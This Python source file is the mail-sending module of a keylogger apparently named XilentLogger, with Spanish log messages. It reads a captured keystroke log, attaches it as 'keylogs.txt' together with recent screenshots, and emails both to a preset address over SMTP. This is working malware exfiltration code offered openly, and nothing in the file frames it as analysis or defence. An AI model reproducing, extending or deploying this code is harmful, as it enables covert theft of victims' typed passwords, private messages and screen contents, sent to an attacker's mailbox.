import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pathlib import Path
from .SMTP_config import SMTP_CONFIG, LOG_PATH, SCREENSHOT_DIR, LOGGER_HEADER
import logging
import glob
import os

class MailSender:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
    def _create_email_base(self):
        msg = MIMEMultipart()
        msg["Subject"] = SMTP_CONFIG.get('subject', "XilentLogger - Datos Capturados")
        msg["From"] = SMTP_CONFIG['from_email']
        msg["To"] = SMTP_CONFIG['to_email']
        
        body = MIMEText(LOGGER_HEADER + """
        \nContenido adjunto:
        - logs.txt: Registro de actividad
        - Capturas de pantalla recientes

        """)
        msg.attach(body)
        return msg
        
    def _attach_logs(self, msg):
        try:
            with open(LOG_PATH, "rb") as f:
                log_part = MIMEText(f.read().decode('utf-8', errors='ignore'), 'plain')
                log_part.add_header('Content-Disposition', 'attachment', filename="keylogs.txt")
                msg.attach(log_part)
        except Exception as e:
            self.logger.error(f"Error adjuntando logs: {str(e)}")
            
    def _attach_screenshots(self, msg):
        try:
            if SCREENSHOT_DIR.exists():
                screenshots = sorted(
                    SCREENSHOT_DIR.glob("*.png"),
                    key=os.path.getmtime,
                    reverse=True
                )[:SMTP_CONFIG.get('max_screenshots', 3)]
                
                for ss in screenshots:
                    with open(ss, "rb") as f:
                        img_part = MIMEImage(f.read())
                        img_part.add_header('Content-Disposition', 'attachment', filename=ss.name)
                        msg.attach(img_part)
        except Exception as e:
            self.logger.error(f"Error adjuntando screenshots: {str(e)}")

    def send_log_with_screenshots(self):
        try:
            msg = self._create_email_base()
            self._attach_logs(msg)
            self._attach_screenshots(msg)
            
            with smtplib.SMTP(SMTP_CONFIG['host'], SMTP_CONFIG['port']) as smtp:
                smtp.starttls()
                smtp.login(SMTP_CONFIG['username'], SMTP_CONFIG['password'])
                smtp.send_message(msg)
                
            self.logger.info("Datos enviados exitosamente (logs + screenshots)")
            return True
            
        except Exception as e:
            self.logger.error(f"Error crítico al enviar email: {str(e)}")
            return False